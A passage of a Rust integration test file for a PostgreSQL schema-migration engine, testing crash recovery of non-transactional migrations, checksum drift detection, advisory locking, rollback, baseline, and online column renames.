        &format!(
            "CREATE TABLE \"{}\".items (id int PRIMARY KEY)",
            cfg.project_schema
        ),
    );
    apply(
        &session,
        &cfg,
        std::slice::from_ref(&base),
        Approval::None,
        "app_test",
    )
    .await
    .expect("apply base");

    // The migration that half-ran, and the edited one the operator now supplies.
    let v1 = MigrationId::generate();
    let half_ran = mig_nontxn(
        v1.clone(),
        "idx_items",
        &format!(
            "CREATE INDEX CONCURRENTLY IF NOT EXISTS items_a_idx ON \"{}\".items (id)",
            cfg.project_schema
        ),
    );
    let edited = mig_nontxn(
        v1.clone(),
        "idx_items",
        &format!(
            "CREATE INDEX CONCURRENTLY IF NOT EXISTS items_b_idx ON \"{}\".items (id)",
            cfg.project_schema
        ),
    );
    assert_ne!(
        half_ran.checksum.as_str(),
        edited.checksum.as_str(),
        "the edit must move the checksum for this test to mean anything"
    );

    // Arm the marker for the body that half-ran, then supply the edited one.
    zero_migrate::record_started(
        &session,
        &cfg,
        v1.as_str(),
        "idx_items",
        half_ran.checksum.as_str(),
        "app_test",
    )
    .await
    .expect("arm started marker");

    let err = apply(
        &session,
        &cfg,
        &[base.clone(), edited.clone()],
        Approval::None,
        "app_test",
    )
    .await
    .expect_err("a marker disagreeing with the supplied migration must abort");
    match err {
        ApplyError::ChecksumDrift {
            version,
            recorded,
            expected,
        } => {
            assert_eq!(version, v1.as_str());
            assert_eq!(recorded, half_ran.checksum.as_str());
            assert_eq!(expected, edited.checksum.as_str());
        }
        other => panic!("expected ChecksumDrift, got {other:?}"),
    }

    // The marker survives the refusal, so the operator can still inspect it.
    let applied = zero_migrate::applied(&session, &cfg)
        .await
        .expect("journal read");
    assert!(
        applied
            .iter()
            .any(|e| e.version == v1.as_str() && e.checksum == half_ran.checksum.as_str()),
        "the refusal must not overwrite the evidence: {applied:?}"
    );

    drop_schemas(&session, &cfg).await;
}

/// Is an inflight `started` marker armed for `version`?
///
/// Read straight off the side-table rather than through `applied`, because these
/// tests care about the marker's presence on its own, separately from whatever the
/// journal says about the version.
async fn inflight_marker_armed(
    session: &PgDevSession,
    cfg: &ExecutorConfig,
    version: &str,
) -> bool {
    use zero_migrate::driver::SqlSession;
    let row = session
        .query_one(
            &format!(
                "SELECT EXISTS (SELECT 1 FROM \"{}\".schema_migrations_inflight \
                 WHERE version = $1) AS armed",
                cfg.pg.meta_schema
            ),
            &[version.into()],
        )
        .await
        .expect("inflight marker probe");
    row.try_get::<_, bool>("armed").expect("decode armed")
}

/// A non-transactional `CREATE TABLE` whose `up` committed before the crash must
/// be REFUSED on replay, with the marker left armed for an operator repair.
///
/// The two-phase recovery path re-runs the `up` verbatim, which is only sound for
/// an `up` it can prove replay-safe. A `CREATE TABLE` is not, and replaying it
/// anyway is what this measures the alternative to: the object is already there,
/// so the replay dies on `already exists`, re-arms the marker it just cleared, and
/// every later deploy repeats that exact failure. The version never lands and no
/// amount of re-deploying moves it.
#[compio::test]
async fn a_committed_non_txn_create_table_is_refused_on_replay_with_the_marker_kept() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let v1 = MigrationId::generate();
    let create = mig_nontxn(
        v1.clone(),
        "wedge_table",
        &format!(
            "CREATE TABLE \"{}\".wedged (id bigint PRIMARY KEY)",
            cfg.project_schema
        ),
    );

    // Crash after the `up` auto-committed and before the completed row landed.
    zero_migrate::fault::arm(
        zero_migrate::fault::points::APPLY_AFTER_UP_BEFORE_COMPLETED,
        0,
    );
    let crashed = apply(
        &session,
        &cfg,
        std::slice::from_ref(&create),
        Approval::None,
        "app_test",
    )
    .await;
    zero_migrate::fault::disarm_all();
    assert!(
        crashed.is_err(),
        "the injected crash must abort the apply: {crashed:?}"
    );
    assert!(
        table_exists(&session, &cfg.project_schema, "wedged").await,
        "a non-txn up auto-commits, so the table survives the crash"
    );
    assert!(
        inflight_marker_armed(&session, &cfg, v1.as_str()).await,
        "the crash leaves the marker armed"
    );

    // The replay must refuse in a way an operator can act on.
    let err = apply(
        &session,
        &cfg,
        std::slice::from_ref(&create),
        Approval::None,
        "app_test",
    )
    .await
    .expect_err("replaying a committed non-txn CREATE TABLE must fail closed");
    let text = err.to_string();
    match &err {
        ApplyError::NonTxnRecoveryUnsafe {
            version,
            reason,
            meta_schema,
        } => {
            assert_eq!(version, v1.as_str());
            assert_eq!(meta_schema, &cfg.pg.meta_schema);
            assert!(
                reason.contains("not one of the statements recovery can re-run"),
                "the reason names why the up was not admitted: {reason}"
            );
        }
        other => panic!("expected NonTxnRecoveryUnsafe, got {other:?}"),
    }
    assert!(
        text.contains("schema_migrations_inflight"),
        "the refusal must name the repair the operator can perform: {text}"
    );
    assert!(
        !text.contains("already exists"),
        "the refusal must not be the raw server error from a blind replay: {text}"
    );
    assert!(
        inflight_marker_armed(&session, &cfg, v1.as_str()).await,
        "the refusal preserves the marker as the evidence of a half-applied version"
    );

    // Stable across replays: the same refusal, never a different failure and never
    // a silent success.
    let again = apply(
        &session,
        &cfg,
        std::slice::from_ref(&create),
        Approval::None,
        "app_test",
    )
    .await
    .expect_err("the refusal is the steady state until an operator resolves it");
    assert_eq!(
        again.to_string(),
        text,
        "a second replay reports the identical refusal"
    );

    drop_schemas(&session, &cfg).await;
}

/// CONTROL: the replay-safe non-txn shape still recovers on its own.
///
/// `CREATE INDEX CONCURRENTLY IF NOT EXISTS` with an explicit name is exactly what
/// the two-phase path was built for, and a crash after it committed must still
/// converge without an operator.
#[compio::test]
async fn a_committed_non_txn_concurrent_index_still_recovers_on_replay() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let v0 = MigrationId::generate();
    let base = mig(
        v0.clone(),
        "base_items",
        &format!(
            "CREATE TABLE \"{}\".items (id bigint PRIMARY KEY, tag text)",
            cfg.project_schema
        ),
    );
    apply(
        &session,
        &cfg,
        std::slice::from_ref(&base),
        Approval::None,
        "app_test",
    )
    .await
    .expect("apply base");

    let v1 = MigrationId::generate();
    let idx = mig_nontxn(
        v1.clone(),
        "idx_items_tag",
        &format!(
            "CREATE INDEX CONCURRENTLY IF NOT EXISTS items_tag_idx ON \"{}\".items (tag)",
            cfg.project_schema
        ),
    );

    zero_migrate::fault::arm(
        zero_migrate::fault::points::APPLY_AFTER_UP_BEFORE_COMPLETED,
        0,
    );
    let crashed = apply(
        &session,
        &cfg,
        &[base.clone(), idx.clone()],
        Approval::None,
        "app_test",
    )
    .await;
    zero_migrate::fault::disarm_all();
    assert!(
        crashed.is_err(),
        "the injected crash must abort the apply: {crashed:?}"
    );
    assert!(
        inflight_marker_armed(&session, &cfg, v1.as_str()).await,
        "the crash leaves the marker armed"
    );

    let out = apply(
        &session,
        &cfg,
        &[base.clone(), idx.clone()],
        Approval::None,
        "app_test",
    )
    .await
    .expect("the replay-safe shape recovers without an operator");
    assert!(
        out.recovered.contains(&v1.as_str().to_string()),
        "the replay is reported as a recovery: {out:?}"
    );
    let applied = zero_migrate::applied(&session, &cfg)
        .await
        .expect("journal read");
    assert!(
        applied.iter().any(|e| e.version == v1.as_str()),
        "the recovered version is net-applied"
    );
    assert!(
        !inflight_marker_armed(&session, &cfg, v1.as_str()).await,
        "a completed recovery clears the marker"
    );

    drop_schemas(&session, &cfg).await;
}

/// CONTROL: the same `CREATE TABLE` body in the TRANSACTIONAL shape rolls back at
/// the same crash boundary and replays cleanly.
///
/// This is why the fix belongs at recovery rather than at the fresh-apply gate:
/// the body is fine, it is `transaction:false` that removes the rollback.
#[compio::test]
async fn a_transactional_create_table_rolls_back_at_the_same_boundary_and_replays() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let v1 = MigrationId::generate();
    let create = mig(
        v1.clone(),
        "txn_table",
        &format!(
            "CREATE TABLE \"{}\".recoverable (id bigint PRIMARY KEY)",
            cfg.project_schema
        ),
    );

    zero_migrate::fault::arm(
        zero_migrate::fault::points::APPLY_AFTER_UP_BEFORE_COMPLETED,
        0,
    );
    let crashed = apply(
        &session,
        &cfg,
        std::slice::from_ref(&create),
        Approval::None,
        "app_test",
    )
    .await;
    zero_migrate::fault::disarm_all();
    assert!(
        crashed.is_err(),
        "the injected crash must abort the apply: {crashed:?}"
    );
    assert!(
        !table_exists(&session, &cfg.project_schema, "recoverable").await,
        "the transactional shape rolls the up back with the journal row"
    );
    assert!(
        !inflight_marker_armed(&session, &cfg, v1.as_str()).await,
        "the transactional shape never arms a marker"
    );

    let out = apply(
        &session,
        &cfg,
        std::slice::from_ref(&create),
        Approval::None,
        "app_test",
    )
    .await
    .expect("the transactional shape replays cleanly");
    assert!(
        out.applied.contains(&v1.as_str().to_string()),
        "the replay applies the migration: {out:?}"
    );
    assert!(table_exists(&session, &cfg.project_schema, "recoverable").await);

    drop_schemas(&session, &cfg).await;
}

/// An armed marker outranks an `OnUnmet::Skip` precondition.
///
/// The half-applied `up` is exactly what makes such a precondition stop holding,
/// so the skip arm fires precisely on the versions that most need attention. A
/// skipped version is reported as a clean deploy with nothing applied, so the
/// deploy goes green forever while the migration never lands - quieter, and worse,
/// than the halt arm.
#[compio::test]
async fn an_armed_marker_outranks_a_skip_precondition() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let v1 = MigrationId::generate();
    let mut gated = mig_nontxn(
        v1.clone(),
        "gated_table",
        &format!(
            "CREATE TABLE \"{}\".gated (id bigint PRIMARY KEY)",
            cfg.project_schema
        ),
    );
    // "Run this once the table is still absent" - met on the first attempt, unmet
    // the moment the crashed `up` has created it.
    gated.preconditions = vec![zero_migrate::PreconditionCheck::skip(
        zero_migrate::Precondition::TableNotExists {
            table: "gated".to_string(),
        },
    )];
    gated.checksum = Checksum::of(&zero_migrate::ChecksumInput::from_migration(&gated));

    zero_migrate::fault::arm(
        zero_migrate::fault::points::APPLY_AFTER_UP_BEFORE_COMPLETED,
        0,
    );
    let crashed = apply(
        &session,
        &cfg,
        std::slice::from_ref(&gated),
        Approval::None,
        "app_test",
    )
    .await;
    zero_migrate::fault::disarm_all();
    assert!(
        crashed.is_err(),
        "the injected crash must abort the apply: {crashed:?}"
    );
    assert!(
        inflight_marker_armed(&session, &cfg, v1.as_str()).await,
        "the crash leaves the marker armed"
    );

    let replay = apply(
        &session,
        &cfg,
        std::slice::from_ref(&gated),
        Approval::None,
        "app_test",
    )
    .await;
    let err = replay.expect_err(
        "a version holding an armed marker must never be reported as a successful deploy",
    );
    assert!(
        matches!(err, ApplyError::NonTxnRecoveryUnsafe { .. }),
        "the marker's refusal is what the operator sees, not a skip: {err:?}"
    );
    assert!(
        err.to_string().contains("schema_migrations_inflight"),
        "the refusal names the repair: {err}"
    );
    assert!(
        inflight_marker_armed(&session, &cfg, v1.as_str()).await,
        "the marker survives the refusal"
    );

    drop_schemas(&session, &cfg).await;
}

// ---------------------------------------------------------------------------
// Scenario 3 — journal ensure / record / read
// ---------------------------------------------------------------------------

/// `ensure_journal` is idempotent (re-bootstrap is a no-op), and a manually
/// recorded completed event reads back over the seam.
#[compio::test]
async fn journal_ensure_is_idempotent_and_records_read_back() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;

    ensure_journal(&session, &cfg)
        .await
        .expect("ensure_journal 1");
    // Re-bootstrap: must not error (CREATE … IF NOT EXISTS discipline).
    ensure_journal(&session, &cfg)
        .await
        .expect("ensure_journal 2 (idempotent)");

    let v = MigrationId::generate();
    zero_migrate::record_completed(
        &session,
        &cfg,
        zero_migrate::apply::journal::CompletedRecord {
            version: v.as_str(),
            name: "manual",
            checksum: "cafef00d",
            applied_by: "operator",
            exec_ms: 5,
            kind: "apply",
        },
    )
    .await
    .expect("record_completed");

    let applied = zero_migrate::applied(&session, &cfg)
        .await
        .expect("journal read");
    assert_eq!(applied.len(), 1);
    assert_eq!(applied[0].version, v.as_str());
    assert_eq!(applied[0].checksum, "cafef00d");

    drop_schemas(&session, &cfg).await;
}

// ---------------------------------------------------------------------------
// Scenario 4 — checksum + drift detection
// ---------------------------------------------------------------------------

/// A tampered recorded checksum is caught by `check_checksum_drift`; a matching set
/// reports no drift.
#[compio::test]
async fn checksum_drift_detects_a_tampered_applied_migration() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let v = MigrationId::generate();
    let up = format!(
        "CREATE TABLE \"{}\".accounts (id bigint PRIMARY KEY)",
        cfg.project_schema
    );
    let m = mig(v.clone(), "create_accounts", &up);
    apply(
        &session,
        &cfg,
        std::slice::from_ref(&m),
        Approval::None,
        "app_test",
    )
    .await
    .expect("apply");

    // No drift when the set matches the journal.
    let report = check_checksum_drift(&session, &cfg, std::slice::from_ref(&m))
        .await
        .expect("drift check clean");
    assert!(
        report.is_clean(),
        "no drift when the set matches: {report:?}"
    );

    // Tamper: same version, different `up` → different checksum. The journal's
    // recorded checksum no longer matches the set's ⇒ drift.
    let tampered = mig(
        v.clone(),
        "create_accounts",
        &format!(
            "CREATE TABLE \"{}\".accounts (id bigint PRIMARY KEY, evil text)",
            cfg.project_schema
        ),
    );
    assert_ne!(
        tampered.checksum.as_str(),
        m.checksum.as_str(),
        "tamper changed the checksum"
    );
    let report2 = check_checksum_drift(&session, &cfg, std::slice::from_ref(&tampered))
        .await
        .expect("drift check tampered");
    assert!(
        !report2.is_clean(),
        "a tampered applied checksum is detected as drift"
    );

    drop_schemas(&session, &cfg).await;
}

/// `snapshot_schema` introspects the live catalog and reflects a table the apply
/// created — the read side of drift, driven over the seam (the domain-typed
/// `information_schema` decode path through `PgDevSession`).
#[compio::test]
async fn snapshot_schema_reflects_the_live_catalog() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let v = MigrationId::generate();
    let up = format!(
        "CREATE TABLE \"{}\".profiles (id bigint PRIMARY KEY, email text NOT NULL, age int)",
        cfg.project_schema
    );
    apply(
        &session,
        &cfg,
        &[mig(v, "create_profiles", &up)],
        Approval::None,
        "app_test",
    )
    .await
    .expect("apply");

    let snap = snapshot_schema(&session, &cfg.project_schema)
        .await
        .expect("snapshot_schema over the seam");
    let table = snap
        .tables
        .get("profiles")
        .expect("the created table is in the live snapshot");
    assert!(
        table.columns.iter().any(|c| c.name == "email"),
        "the introspected snapshot carries the author column (information_schema \
         domain decode ran through the seam)"
    );

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn snapshot_schema_preserves_quoted_named_type_identity() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let mut cfg = cfg_for(&tok);
    cfg.project_schema = format!("AppSpace_{tok}");
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    session
        .batch(&format!(
            "CREATE TYPE \"{}\".\"MoodState\" AS ENUM ('ready', 'done'); \
             CREATE DOMAIN \"{}\".\"StateCode\" AS text CHECK (VALUE <> ''); \
             CREATE TABLE \"{}\".named_values (\
                 mood \"{}\".\"MoodState\", \
                 code \"{}\".\"StateCode\"\
             )",
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema
        ))
        .await
        .expect("create quoted enum/domain fixture");

    let snap = snapshot_schema(&session, &cfg.project_schema)
        .await
        .expect("snapshot quoted named types");
    let table = &snap.tables["named_values"];
    for (column_name, type_name) in [("mood", "MoodState"), ("code", "StateCode")] {
        let column = table
            .columns
            .iter()
            .find(|column| column.name == column_name)
            .expect("named type column is introspected");
        assert_eq!(
            column.data_type,
            format!("{}.{}", cfg.project_schema, type_name),
            "named type comparison uses unquoted catalog identity"
        );
        assert_eq!(
            column.ddl_type_override.as_deref(),
            Some(format!("\"{}\".\"{}\"", cfg.project_schema, type_name).as_str()),
            "named type emission retains exact quoted DDL spelling"
        );
    }

    drop_schemas(&session, &cfg).await;
}

// ---------------------------------------------------------------------------
// Scenario 5 — concurrency / lock contention
// ---------------------------------------------------------------------------

/// A second session cannot take the project advisory lock while a first holds it,
/// and can once it is released — the lock-contention invariant that serializes
/// concurrent deploys for the same project.
#[compio::test]
async fn second_session_blocks_on_the_held_project_lock() {
    let url = skip_if_no_pg!();
    let holder = PgDevSession::connect(&url);
    let contender = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);

    use zero_migrate::driver::SqlSession;
    let backend = PostgresBackend::new_generic(&holder);
    backend
        .acquire_project_lock(&cfg)
        .await
        .expect("holder acquires");

    // The contender uses pg_try_advisory_lock on the SAME key → must fail (held).
    let got = contender
        .query_one(
            "SELECT pg_try_advisory_lock(hashtext($1)::bigint) AS got",
            &[cfg.project_id.as_str().into()],
        )
        .await
        .expect("try lock");
    assert!(
        !got.try_get::<_, bool>("got").expect("decode got"),
        "a second session must NOT acquire the project lock while it is held"
    );

    backend
        .release_project_lock(&cfg)
        .await
        .expect("holder releases");
    let got2 = contender
        .query_one(
            "SELECT pg_try_advisory_lock(hashtext($1)::bigint) AS got",
            &[cfg.project_id.as_str().into()],
        )
        .await
        .expect("try lock 2");
    assert!(
        got2.try_get::<_, bool>("got").expect("decode got2"),
        "once released, the second session can take the lock"
    );
    // Release the contender's lock so the session is clean.
    let _ = contender
        .exec(
            "SELECT pg_advisory_unlock(hashtext($1)::bigint)",
            &[cfg.project_id.as_str().into()],
        )
        .await;
}

// ---------------------------------------------------------------------------
// Scenario 6 — rollback
// ---------------------------------------------------------------------------

/// A migration's `down` runs through the shipped `rollback_one_transactional`
/// backend leaf, a `rolled_back` event appends (append-only journal), and the
/// version becomes pending again (re-appliable).
#[compio::test]
async fn rollback_runs_down_appends_event_and_is_reappliable() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let v = MigrationId::generate();
    let up = format!("CREATE TABLE \"{}\".temp_t (id bigint)", cfg.project_schema);
    let down = format!("DROP TABLE \"{}\".temp_t", cfg.project_schema);
    let m = mig_with_down(v.clone(), "create_temp_t", &up, &down);

    apply(
        &session,
        &cfg,
        std::slice::from_ref(&m),
        Approval::None,
        "app_test",
    )
    .await
    .expect("apply");
    assert!(
        table_exists(&session, &cfg.project_schema, "temp_t").await,
        "table created"
    );

    // Roll back the ONE migration through the shipped backend leaf.
    let backend = PostgresBackend::new_generic(&session);
    backend
        .rollback_one_transactional(&cfg, &m, "operator")
        .await
        .expect("rollback_one_transactional");
    assert!(
        !table_exists(&session, &cfg.project_schema, "temp_t").await,
        "the down ran — table dropped"
    );

    // The journal is append-only: the `applied` row is NOT deleted; a `rolled_back`
    // event is appended, so the version is net-rolled-back (pending again).
    use zero_migrate::driver::SqlSession;
    let counts = session
        .query_one(
            &format!(
                "SELECT \
                   count(*) FILTER (WHERE event_kind = 'applied')::int8     AS applied_n, \
                   count(*) FILTER (WHERE event_kind = 'rolled_back')::int8 AS rolled_n \
                 FROM \"{}\".schema_migrations WHERE version = $1",
                cfg.pg.meta_schema
            ),
            &[v.as_str().into()],
        )
        .await
        .expect("journal event counts");
    assert_eq!(
        counts
            .try_get::<_, i64>("applied_n")
            .expect("decode applied_n"),
        1,
        "the applied row is append-only (not deleted on rollback)"
    );
    assert_eq!(
        counts
            .try_get::<_, i64>("rolled_n")
            .expect("decode rolled_n"),
        1,
        "a rolled_back event was appended"
    );

    // Net state: the version is now pending → a re-apply re-creates the table.
    let out = apply(
        &session,
        &cfg,
        std::slice::from_ref(&m),
        Approval::None,
        "app_test",
    )
    .await
    .expect("re-apply after rollback");
    assert!(
        out.applied.contains(&v.as_str().to_string()),
        "the rolled-back version is re-appliable"
    );
    assert!(
        table_exists(&session, &cfg.project_schema, "temp_t").await,
        "table re-created"
    );

    drop_schemas(&session, &cfg).await;
}

// ---------------------------------------------------------------------------
// Scenario 7 — baseline / adopt
// ---------------------------------------------------------------------------

/// Baseline records a migration `completed` WITHOUT running its `up`: the
/// pre-existing table is created directly (not via the engine), and the baseline's
/// `up` re-creates the SAME table WITHOUT `IF NOT EXISTS` — so if baseline ran the
/// up it would error. It must record it `completed` and leave the table intact.
#[compio::test]
async fn baseline_records_completed_without_running_up() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    ensure_journal(&session, &cfg)
        .await
        .expect("ensure_journal");

    use zero_migrate::driver::SqlSession;
    // Create the table DIRECTLY (as if the DB predates the engine).
    session
        .batch(&format!(
            "CREATE TABLE \"{}\".legacy (id bigint PRIMARY KEY)",
            cfg.project_schema
        ))
        .await
        .expect("pre-create legacy table");

    // A baseline whose `up` re-creates the SAME table WITHOUT IF NOT EXISTS: running
    // it would fail ("relation already exists"). baseline must NOT run it.
    let v = MigrationId::generate();
    let up = format!(
        "CREATE TABLE \"{}\".legacy (id bigint PRIMARY KEY)",
        cfg.project_schema
    );
    let m = mig(v.clone(), "baseline_legacy", &up);

    let backend = PostgresBackend::new_generic(&session);
    backend
        .baseline_one(&cfg, &m, "operator")
        .await
        .expect("baseline_one records completed without running the up");

    // The version is journaled net-applied (via the baseline), and the table
    // survived (the up did NOT run).
    let applied = zero_migrate::applied(&session, &cfg)
        .await
        .expect("journal read");
    assert!(
        applied.iter().any(|e| e.version == v.as_str()),
        "the baseline recorded the version as net-applied"
    );
    assert!(
        table_exists(&session, &cfg.project_schema, "legacy").await,
        "the pre-existing table is intact — baseline did NOT run the up"
    );

    drop_schemas(&session, &cfg).await;
}

// ---------------------------------------------------------------------------
// Scenario 8 — status / history over the seam
// ---------------------------------------------------------------------------

/// `status` reports an applied migration and no pending; `history` returns the
/// applied event — both driven generically over the `SqlSession` seam.
#[compio::test]
async fn status_and_history_report_over_the_seam() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let v = MigrationId::generate();
    let up = format!("CREATE TABLE \"{}\".s (id bigint)", cfg.project_schema);
    let m = mig(v.clone(), "create_s", &up);
    apply(
        &session,
        &cfg,
        std::slice::from_ref(&m),
        Approval::None,
        "app_test",
    )
    .await
    .expect("apply");

    let st = status(&session, &cfg, std::slice::from_ref(&m))
        .await
        .expect("status over the seam");
    assert!(
        st.applied.iter().any(|e| e.version == v.as_str()),
        "status reports the applied version"
    );
    assert!(
        st.pending.is_empty(),
        "no pending after applying the only migration: {:?}",
        st.pending
    );

    let hist = history(&session, &cfg)
        .await
        .expect("history over the seam");
    assert!(
        hist.iter().any(|e| e.version == v.as_str()),
        "history returns the applied event"
    );

    drop_schemas(&session, &cfg).await;
}

/// A denied / non-idempotent migration set aborts BEFORE any migration runs
/// (all-up-front guard): a bare-DML non-txn `up` is refused, and nothing is applied.
#[compio::test]
async fn non_idempotent_non_txn_dml_aborts_before_any_apply() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    // A base table + a non-txn migration whose `up` is bare DML (forbidden on the
    // two-phase path: crash recovery would re-run it verbatim and double-apply).
    let v0 = MigrationId::generate();
    let base = mig(
        v0,
        "base",
        &format!("CREATE TABLE \"{}\".t (id bigint)", cfg.project_schema),
    );
    let v1 = MigrationId::generate();
    let bad = mig_nontxn(
        v1,
        "bad_dml",
        &format!("INSERT INTO \"{}\".t (id) VALUES (1)", cfg.project_schema),
    );

    let err = apply(&session, &cfg, &[base, bad], Approval::None, "app_test")
        .await
        .expect_err("bare-DML non-txn migration must be refused");
    assert!(
        matches!(err, ApplyError::NonIdempotentNonTxn { .. }),
        "expected NonIdempotentNonTxn, got {err:?}"
    );
    // All-up-front: nothing applied (not even the valid base migration).
    let applied = zero_migrate::applied(&session, &cfg)
        .await
        .unwrap_or_default();
    assert!(
        applied.is_empty(),
        "a denied batch applies NOTHING (all-up-front guard): {applied:?}"
    );

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn limited_delete_honors_its_cap_across_partitions() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    session
        .batch(&format!(
            "CREATE TABLE \"{}\".events (id bigint, code bigint) PARTITION BY RANGE (id); \
             CREATE TABLE \"{}\".events_low PARTITION OF \"{}\".events FOR VALUES FROM (0) TO (10); \
             CREATE TABLE \"{}\".events_high PARTITION OF \"{}\".events FOR VALUES FROM (10) TO (20); \
             INSERT INTO \"{}\".events VALUES (1, -1), (11, -1)",
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema
        ))
        .await
        .expect("create partitioned delete fixture");

    let predicate: zero_migrate::model::expr::Expr = serde_json::from_value(serde_json::json!({
        "node": "binOp",
        "op": "lt",
        "lhs": { "node": "colRef", "name": "code" },
        "rhs": { "node": "literal", "value": 0 }
    }))
    .expect("parse delete predicate");
    let assembled = zero_migrate::render::dml::assemble_delete(
        &cfg.project_schema,
        zero_migrate::SqlDialect::Postgres,
        "events",
        &predicate,
        Some(1),
    )
    .expect("assemble limited delete");
    assert!(assembled.template.contains("(tableoid, ctid)"));
    let changed = session
        .exec_text(
            &assembled.template,
            &[Some("0".to_string()), Some("1".to_string())],
        )
        .await
        .expect("execute limited delete");
    assert_eq!(changed, 1, "LIMIT 1 must delete exactly one physical row");
    let remaining: i64 = session
        .query_one(
            &format!(
                "SELECT count(*)::bigint AS n FROM \"{}\".events",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("count remaining rows")
        .try_get("n")
        .expect("decode count");
    assert_eq!(remaining, 1);

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn pending_online_renames_can_be_completed_or_aborted_safely() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    session
        .batch(&format!(
            "CREATE TABLE \"{}\".apply_users (id bigint PRIMARY KEY, email text); \
             INSERT INTO \"{}\".apply_users VALUES (1, 'apply@example.test'); \
             CREATE TABLE \"{}\".abort_users (id bigint PRIMARY KEY, email text); \
             INSERT INTO \"{}\".abort_users VALUES (1, 'abort@example.test'); \
             CREATE TABLE \"{}\".abort_partial_users (id bigint PRIMARY KEY, email text); \
             INSERT INTO \"{}\".abort_partial_users VALUES (1, 'partial@example.test'); \
             CREATE TABLE \"{}\".drift_users (id bigint PRIMARY KEY, email text); \
             INSERT INTO \"{}\".drift_users VALUES (1, 'preserve@example.test'); \
             CREATE TABLE \"{}\".numeric_users (id bigint PRIMARY KEY, amount numeric(10,2)); \
             INSERT INTO \"{}\".numeric_users VALUES (1, 12.34); \
             CREATE TABLE \"{}\".timestamp_users (id bigint PRIMARY KEY, created_at timestamp with time zone); \
             INSERT INTO \"{}\".timestamp_users VALUES (1, '2026-01-02 03:04:05+00'); \
             CREATE TYPE \"{}\".item_state AS ENUM ('ready', 'done'); \
             CREATE TABLE \"{}\".enum_users (id bigint PRIMARY KEY, state \"{}\".item_state); \
             INSERT INTO \"{}\".enum_users VALUES (1, 'ready'); \
             CREATE DOMAIN \"{}\".state_code AS text CHECK (VALUE <> ''); \
             CREATE TABLE \"{}\".domain_users (id bigint PRIMARY KEY, state \"{}\".state_code); \
             INSERT INTO \"{}\".domain_users VALUES (1, 'ready'); \
             CREATE TABLE \"{}\".direct_users (id bigint PRIMARY KEY, email text); \
             INSERT INTO \"{}\".direct_users VALUES (1, 'direct@example.test')",
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema,
            cfg.project_schema
        ))
        .await
        .expect("create rename fixtures");

    let backend = PostgresBackend::new_generic(&session);
    let engine = MigrationEngine::new();
    let apply_plan = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test")
        .author(&OnlineIntent::RenameColumn {
            table: "apply_users".into(),
            from: "email".into(),
            to: "email_address".into(),
            ty: "text".into(),
        })
        .expect("author forward-completion rename");
    let apply_pending = apply_plan.trigger_version.as_str().to_string();
    engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::OnlineRename(RenameStep::PgExpandContract(
                apply_plan,
            ))],
            &["apply_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
